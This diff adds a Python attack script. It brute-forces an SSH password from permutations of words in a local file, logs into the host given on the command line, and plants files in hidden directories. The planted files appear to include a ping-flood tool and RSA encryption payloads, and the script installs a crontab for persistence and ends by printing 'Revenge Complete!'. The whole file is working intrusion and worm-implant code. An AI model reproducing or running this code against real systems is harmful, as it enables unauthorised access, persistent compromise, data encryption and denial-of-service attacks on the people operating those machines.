@@ -1,0 +1,54 @@
+#!/usr/bin/env python3
+import sys
+import paramiko
+import time
+import socket
+import os
+from itertools import *
+attacker_ip = sys.argv[1]
+password = ''
+datContent = [i.strip().split(':')[1] for i in open('./attacker.dat').readlines()]
+datContent = datContent[:-1] + [datContent[-1].split(' ')[0]] + [datContent[-1].split(' ')[1]]
+
+for i in range(1, 10):
+	response = 1e9
+	for combine in permutations(datContent, i):
+		password = ''.join(map(str, combine))
+		command = 'sshpass -p ' + password + ' ssh attacker@' + attacker_ip + ' exit'
+		response = os.system(command)
+		if response == 0:
+			break
+	if response == 0:
+		break
+
+ssh = paramiko.SSHClient()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+ssh.connect(attacker_ip, 22, 'attacker', password)
+ssh.exec_command('mkdir /home/attacker/Public/.Simple_Worm')
+ssh.exec_command('mkdir /home/attacker/Desktop/.Backup')
+
+sf = paramiko.Transport((attacker_ip, 22))
+sf.connect(username = 'attacker',password = password)
+sftp = paramiko.SFTPClient.from_transport(sf)		    
+sftp.put('./Loop_ping', '/home/attacker/Public/.Simple_Worm/Loop_ping')
+sftp.put('./Loop_ping', '/home/attacker/Desktop/.Backup/Loop_ping')
+sftp.put('./RSA_Encrypt', '/home/attacker/Public/.Simple_Worm/RSA_Encrypt')
+sftp.put('./RSA_Encrypt', '/home/attacker/Desktop/.Backup/RSA_Encrypt')
+sftp.put('./RSA.py', '/home/attacker/Public/.Simple_Worm/RSA.py')
+sftp.put('./RSA_backup.py', '/home/attacker/Desktop/.Backup/RSA_backup.py')
+sftp.put('./ping_flood.py', '/home/attacker/Public/.Simple_Worm/ping_flood.py')
+sftp.put('./ping_flood_backup.py', '/home/attacker/Desktop/.Backup/ping_flood_backup.py')
+sftp.put('./trigger', '/home/attacker/Public/.Simple_Worm/trigger')
+
+ssh.exec_command('crontab -u attacker /home/attacker/Public/.Simple_Worm/trigger')
+ssh.exec_command('chmod 777 /home/attacker/Public/.Simple_Worm/Loop_ping')
+ssh.exec_command('chmod 777 /home/attacker/Desktop/.Backup/Loop_ping')
+ssh.exec_command('chmod 777 /home/attacker/Public/.Simple_Worm/RSA_Encrypt')
+ssh.exec_command('chmod 777 /home/attacker/Desktop/.Backup/RSA_Encrypt')
+ssh.exec_command('chmod 777 /home/attacker/Public/.Simple_Worm/RSA.py')
+ssh.exec_command('chmod 777 /home/attacker/Desktop/.Backup/RSA_backup.py')
+ssh.exec_command('chmod 777 /home/attacker/Public/.Simple_Worm/ping_flood.py')
+ssh.exec_command('chmod 777 /home/attacker/Desktop/.Backup/ping_flood_backup.py')
+			
+print('Revenge Complete!')
+
